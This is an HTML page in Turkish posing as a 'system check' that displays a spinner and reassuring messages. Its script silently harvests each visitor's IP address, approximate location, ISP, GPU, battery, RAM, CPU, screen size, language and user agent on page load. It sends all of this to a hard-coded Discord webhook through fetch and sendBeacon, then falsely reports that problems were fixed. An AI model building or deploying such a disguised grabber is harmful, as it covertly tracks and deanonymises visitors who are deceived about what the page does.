
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Kontrol√º</title>
    <style>
        body { background-color: #0f0f0f; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; color: #eeeeee; }
        .container { text-align: center; }
        .loader { border: 3px solid #333; border-top: 3px solid #00ff41; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.6s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-weight: 400; font-size: 15px; margin: 0; color: #555; }
        .success-text { color: #00ff41; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div id="loader" class="loader"></div>
        <h2 id="msg">Site ayarlarƒ± kontrol ediliyor...</h2>
    </div>

    <script>
        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        async function herSeyiD√∂k() {
            let data = { gpu: "Bilinmiyor", ven: "Bilinmiyor", loc: "Y√ºkleniyor...", ip: "X", bat: "X", lang: "Bilinmiyor", ram: "Bilinmiyor", cpu: "Bilinmiyor", screen: "Bilinmiyor" };

            // 1. IP ve SESSƒ∞Z KONUM (IPAPI)
            try {
                const res = await fetch('https://ipapi.co/json/');
                if (!res.ok) throw new Error('IPAPI yanƒ±tƒ± ba≈üarƒ±sƒ±z');
                const j = await res.json();
                data.ip = j.ip;
                data.loc = `üìç **B√∂lge:** ${j.city}, ${j.region} / ${j.country_name}\nüõ∞Ô∏è **ISP:** ${j.org}\nüîó [Haritada G√∂r](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
            } catch(e) {
                console.error("IPAPI hatasƒ±: ", e);
                data.loc = "Lokasyon alƒ±namadƒ±";
                data.ip = "IP alƒ±namadƒ±";
            }

            // 2. Cihaz Dili
            try {
                data.lang = navigator.language || "Bilinmiyor";
            } catch(e) {
                console.error("Dil bilgisi alƒ±namadƒ±: ", e);
            }

            // 3. GPU ve VENDOR (WebGL)
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl');
                const d = gl.getExtension('WEBGL_debug_renderer_info');
                if (d) {
                    data.gpu = gl.getParameter(d.UNMASKED_RENDERER_ID);
                    data.ven = gl.getParameter(d.UNMASKED_VENDOR_ID);
                } else {
                    data.gpu = "WebGL bilgisi alƒ±namadƒ±";
                    data.ven = "WebGL bilgisi alƒ±namadƒ±";
                }
            } catch(e) {
                console.error("GPU bilgisi alƒ±namadƒ±: ", e);
                data.gpu = "Bilinmiyor";
                data.ven = "Bilinmiyor";
            }

            // 4. Pil Durumu
            try {
                const b = await navigator.getBattery();
                data.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Prizde' : 'Pilde'})`;
            } catch(e) {
                console.error("Pil durumu alƒ±namadƒ±: ", e);
                data.bat = "Bilinmiyor";
            }

            // 5. RAM ve CPU Bilgisi
            try {
                data.ram = `${navigator.deviceMemory} GB RAM`;
                data.cpu = `${navigator.hardwareConcurrency} √áekirdek`;
            } catch(e) {
                console.error("RAM/CPU bilgisi alƒ±namadƒ±: ", e);
                data.ram = "Bilinmiyor";
                data.cpu = "Bilinmiyor";
            }

            // 6. Ekran √á√∂z√ºn√ºrl√ºƒü√º
            try {
                data.screen = `${screen.width}x${screen.height}`;
            } catch(e) {
                console.error("Ekran √ß√∂z√ºn√ºrl√ºƒü√º alƒ±namadƒ±: ", e);
                data.screen = "Bilinmiyor";
            }

            // 7. Kullanƒ±cƒ± Agent ve Diƒüer Bilgiler
            const userAgent = navigator.userAgent;

            // 8. O ME≈ûHUR KIRMIZI EMBED ≈ûABLONU
            const payload = {
                embeds: [{
                    title: "üïµÔ∏è KRƒ∞Tƒ∞K Sƒ∞STEM ANALƒ∞Zƒ∞ (Gƒ∞ZLƒ∞ S√úR√úM)",
                    color: 15158332,
                    fields: [
                        { name: "üìç LOKASYON (IP TABANLI)", value: data.loc, inline: false },
                        { name: "üõ†Ô∏è DONANIM KATMANI", value: `**GPU:** \`${data.gpu}\`\n**VENDOR:** \`${data.ven}\`\n**RAM:** ${data.ram}\n**CPU:** ${data.cpu}`, inline: false },
                        { name: "üì± YAZILIM / EKRAN", value: `**OS:** ${navigator.platform}\n**RES:** ${data.screen}`, inline: true },
                        { name: "üîã DURUM", value: data.bat, inline: true },
                        { name: "üîç USER AGENT", value: "```" + userAgent + "```", inline: false },
                        { name: "üåê Cƒ∞HAZ Dƒ∞Lƒ∞", value: data.lang, inline: false },
                        { name: "üåê IP ADRESƒ∞", value: data.ip, inline: false }
                    ],
                    timestamp: new Date()
                }]
            };

            // 9. EN GARANTƒ∞ G√ñNDERƒ∞M (Fetch + Beacon)
            const blob = JSON.stringify(payload);
            fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob })
                .then(response => {
                    if (!response.ok) throw new Error('Webhook g√∂nderim hatasƒ±');
                    console.log("Veri ba≈üarƒ±yla g√∂nderildi.");
                })
                .catch(error => {
                    console.error("Webhook g√∂nderim hatasƒ±: ", error);
                });
            navigator.sendBeacon(u, blob);

            // 10. ARAY√úZ AKI≈ûI
            const msg = document.getElementById('msg');
            const loader = document.getElementById('loader');
            
            setTimeout(() => {
                msg.innerHTML = '<span class="success-text">Site uygun halde!</span>';
            }, 800);

            setTimeout(() => {
                loader.style.display = "none";
                msg.innerHTML = '<span class="success-text">Sorunlar d√ºzeltildi.</span>';
            }, 1800);
        }

        window.onload = herSeyiD√∂k;
    </script>
</body>
</html>
